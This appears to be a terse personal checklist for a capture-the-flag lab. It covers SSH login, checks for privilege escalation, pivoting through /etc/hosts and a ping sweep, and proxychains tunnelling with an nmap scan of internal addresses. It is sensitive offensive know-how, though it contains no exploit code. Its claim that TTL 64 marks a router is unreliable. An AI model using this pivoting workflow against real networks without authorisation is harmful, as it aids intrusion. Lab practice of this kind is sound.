CHECK ROBOTS.TXT
========================================

LOGIN to ssh
whoami && hostname
check for Priv Esc if the CTFD says so



IF NO PRIV ESC then PIVOT

check /etc/hosts
ip a
take first 3 octets and 'PING SWEEP'
    If TTL is 64 then ignore bc its a router
    Record other Ip's

Back out of ssh
Set up tunnels to First box
Proxychain it
sudo proxychains nmap -Pn -sT -T4 192.168.28.181,172 -p22,80,...
    Add response to notes
